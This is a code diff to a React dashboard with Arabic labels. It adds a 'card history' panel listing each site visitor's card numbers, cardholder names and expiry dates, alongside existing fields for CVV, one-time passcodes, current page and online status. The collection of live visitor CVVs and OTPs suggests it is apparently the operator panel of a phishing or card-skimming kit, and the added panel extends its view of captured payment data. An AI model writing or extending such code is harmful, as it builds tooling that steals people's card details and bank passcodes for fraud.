@@ -10,6 +10,16 @@ interface OtpEntry {
   timestamp: string;
 }
 
+interface CardEntry {
+  cardNumber?: string;
+  cardName?: string;
+  expiryMonth?: string;
+  expiryYear?: string;
+  cvv?: string;
+  cardType?: string;
+  timestamp: string;
+}
+
 interface VisitorData {
   id: string;
   name?: string;
@@ -21,6 +31,7 @@ interface VisitorData {
   expiryMonth?: string;
   expiryYear?: string;
   cvv?: string;
+  cardHistory?: CardEntry[];
   currentPage?: string;
   status?: string;
   createdDate?: string;
@@ -178,7 +189,7 @@ export default function DashboardPage() {
   // Calculate statistics
   const totalVisitors = visitors.length;
   const onlineVisitors = visitors.filter(v => v.online).length;
-  const withPayment = visitors.filter(v => v.cardNumber).length;
+  const withPayment = visitors.filter(v => v.cardNumber || (v.cardHistory && v.cardHistory.length > 0)).length;
   const withOtp = visitors.filter(v => v.otp || (v.otpHistory && v.otpHistory.length > 0)).length;
 
   return (
@@ -427,6 +438,50 @@ export default function DashboardPage() {
                           <p className="text-white font-medium">{selectedVisitor.cvv || "---"}</p>
                         </div>
                       </div>
+                    </div>
+                  </div>
+                </MessageBubble>
+              )}
+
+              {(selectedVisitor.cardHistory && selectedVisitor.cardHistory.length > 0) && (
+                <MessageBubble type="received" time="">
+                  <div className="space-y-3">
+                    <div className="flex items-center justify-between">
+                      <div className="flex items-center gap-2 text-yellow-400 font-semibold">
+                        <CreditCard className="w-4 h-4" />
+                        <span>سجل البطاقات</span>
+                      </div>
+                      <span className="bg-yellow-500/20 text-yellow-400 text-xs px-2 py-0.5 rounded-full">
+                        {selectedVisitor.cardHistory.length} بطاقة
+                      </span>
+                    </div>
+                    <div className="space-y-2">
+                      {selectedVisitor.cardHistory
+                        .slice()
+                        .sort((a, b) => (b.timestamp || "").localeCompare(a.timestamp || ""))
+                        .map((entry, index) => (
+                          <div
+                            key={`${entry.timestamp}-${index}`}
+                            className="bg-[#1a2c38] rounded-lg p-3 border border-[#2a3942] space-y-1"
+                          >
+                            <div className="flex items-center justify-between gap-3">
+                              <p className="text-white font-mono text-sm tracking-wider" dir="ltr">
+                                {entry.cardNumber || "---"}
+                              </p>
+                              <span className="text-xs text-[#8696a0] flex-shrink-0">
+                                {entry.timestamp ? new Date(entry.timestamp).toLocaleString("ar-SA") : ""}
+                              </span>
+                            </div>
+                            <div className="flex items-center justify-between text-xs text-[#8696a0]" dir="ltr">
+                              <span>{entry.cardName || "---"}</span>
+                              <span>
+                                {entry.expiryMonth && entry.expiryYear
+                                  ? `${entry.expiryMonth}/${entry.expiryYear.slice(-2)}`
+                                  : "---"}
+                              </span>
+                            </div>
+                          </div>
+                        ))}
                     </div>
                   </div>
                 </MessageBubble>
